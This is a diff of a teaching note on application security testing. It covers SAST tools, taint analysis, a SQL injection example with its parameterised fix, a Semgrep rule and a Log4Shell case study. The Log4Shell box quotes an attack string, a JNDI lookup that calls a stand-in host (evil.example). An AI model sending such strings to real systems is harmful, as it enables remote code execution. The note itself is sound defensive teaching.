@@ -44,7 +44,7 @@ You do not have to invent the process. **Microsoft's Security Development Lifecy
 
 **Static application security testing (SAST)** analyses source code (or bytecode) without running it. Tools include Semgrep, CodeQL, SonarQube and, for Python, Bandit.
 
-The simplest SAST tools match patterns: "flag any call to `eval`". Better tools do **taint analysis**. They track data from **sources** (things an attacker controls) to **sinks** (dangerous operations), and raise an alert if tainted data reaches a sink without passing through a **sanitiser**.
+The simplest SAST tools match patterns: "flag any call to `eval`". Better tools do **taint analysis**. They track data from **taint sources** (things an attacker controls) to **sinks** (dangerous operations), and raise an alert if tainted data reaches a sink without passing through a **sanitising function** (one that makes data safe for that sink, such as escaping or validation).
 
 ```
  source        propagation       sink
@@ -68,7 +68,7 @@ def search():
     return db.execute(q).fetchall()
 ```
 
-The fix is a parameterised query, which keeps the data out of the SQL grammar entirely:
+The fix is a parameterised query, which keeps the data separate from the SQL grammar entirely:
 
 ```python
     q = "SELECT * FROM items WHERE name = ?"
@@ -101,7 +101,7 @@ rules:
           - focus-metavariable: $Q
 ```
 
-This illustrative rule focuses the sink on the *query* argument, so bound data in a separate parameter argument should not create this SQL-text finding. Validate the rule against positive and negative examples for your Semgrep version; this review did not execute the Semgrep engine.
+This illustrative rule focuses the sink on the *query* argument, so bound data in a separate parameter argument is not expected to create this SQL-text finding. Validate the rule against positive and negative examples for your Semgrep version; this review did not execute the Semgrep engine.
 
 ### Strengths and limits of SAST
 
@@ -140,7 +140,7 @@ Three more techniques complete the picture.
 | Fuzzing | Harness | Parser and memory bugs |
 
 > [!example] Log4Shell and the limits of SAST
-> In December 2021, Log4Shell (CVE-2021-44228) could enable remote code execution in affected Log4j Core configurations when attacker-controlled input such as `${jndi:ldap://evil.example/a}` reached a vulnerable lookup path. A scan limited to application code and lacking relevant dependency/flow models might miss the problem: calling `log.info(userAgent)` is normal. The flaw lived in the Log4j library, in a lookup feature added back in 2013. Teams with an accurate dependency inventory could identify candidate exposure more directly than those reconstructing one during the incident. Comparative hour/week response-time claims are omitted because this review did not obtain supporting incident data.
+> In December 2021, Log4Shell (CVE-2021-44228) could enable remote code execution in affected Log4j Core configurations when attacker-controlled input such as `${jndi:ldap://evil.example/a}` reached a vulnerable lookup path. A scan limited to application code and lacking relevant dependency/flow models might miss the problem: calling `log.info(userAgent)` is normal. The flaw lived in the Log4j library, in a lookup feature added back in 2013. Teams with an accurate dependency inventory could identify candidate exposure more directly than those reconstructing one during the incident. Comparative hour/week claims about how quickly teams responded are omitted because this review did not obtain supporting incident data.
 
 ## Putting it in a pipeline
 
@@ -160,8 +160,8 @@ Some practical rules:
 
 1. **Use risk-based build gates.** Baseline and triage existing findings, gate actionable new issues, and escalate severe existing vulnerabilities rather than exempting them merely because they are old. A gate that fails on 3,000 legacy warnings gets switched off.
 2. **Tune rules.** Disable checks that never find anything real in your codebase; add custom rules for your own dangerous patterns.
-3. **Put results where developers work**: as PR comments, not in a separate dashboard nobody opens.
-4. **Use security champions**: one developer per team with extra training, who triages findings and is the first port of call. It scales far better than a central team reviewing everything.
+3. **Put results where developers work**: as PR comments rather than in a separate dashboard nobody opens.
+4. **Use security champions**: one developer per team with extra training, who triages findings and is the first point of contact. It scales far better than a central team reviewing everything.
 5. **Keep humans in the loop.** Code review and threat modelling find logic and design flaws that generic scanners may miss without the relevant security requirements and models.
 
 ## Common pitfalls
